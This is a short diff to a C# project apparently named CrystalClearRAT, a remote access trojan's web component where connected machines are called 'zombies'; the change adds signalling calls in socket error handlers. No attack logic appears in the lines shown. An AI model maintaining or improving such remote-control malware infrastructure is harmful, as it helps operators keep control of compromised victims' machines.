@@ -76,8 +76,9 @@ namespace CrystalClearRAT.Web
                 }
 
                 catch (SocketException)
-                {
+                {            
                     zombie.Destroy();
+                    sendingDone.Set();
                 }
             });
 
@@ -96,6 +97,7 @@ namespace CrystalClearRAT.Web
             catch
             {
                 state.Zombie.Destroy();
+                sendingDone.Set();
             }
             sendingDone.Set();
         }
